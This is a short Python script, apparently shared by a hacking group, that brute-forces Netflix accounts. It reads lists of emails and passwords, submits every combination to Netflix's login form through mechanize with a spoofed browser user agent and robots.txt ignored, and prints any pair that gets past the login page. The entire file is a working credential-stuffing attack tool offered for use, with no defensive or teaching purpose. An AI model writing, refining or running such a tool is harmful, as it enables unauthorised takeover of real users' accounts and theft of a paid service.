
print("""

		Programmer By MeXaW
		@3typa - Twitter
		@Team FOx 4 :)

	""")
print("plz write username list and password list !")

username = raw_input(("User name list > "))
password = raw_input("Password List > ")

#email
#password
username1 = open(username,"r").read().splitlines()
password1 = open(password,"r").read().splitlines()
for k in username1:
	for i in password1:


		from bs4 import BeautifulSoup
		from mechanize import Browser

		import mechanize
		import random
		import cookielib



		# email
		# password
		br = Browser()
		cj = cookielib.LWPCookieJar()
		br.set_handle_robots(False)
		br.set_handle_equiv(True)
		br.set_handle_referer(True)
		br.set_handle_redirect(True)
		br.set_cookiejar(cj)
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		headers = [('User-agent',
					'Mozilla/5.0 (x11; U; Linux i686; en-US; rv:1.9.01) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

		br.addheaders = [('User-agent', random.choice(headers))]
		g = br.open("https://www.netflix.com/sa-en/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse")
		br.select_form(nr=0)
		br.form['email'] = k
		br.form['password'] = i
		br.submit()
		if br.geturl() != "https://www.netflix.com/sa-en/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse":

			print("PAssword Found !",i,"Email >",k)

		else:
			print("Faild",i,k)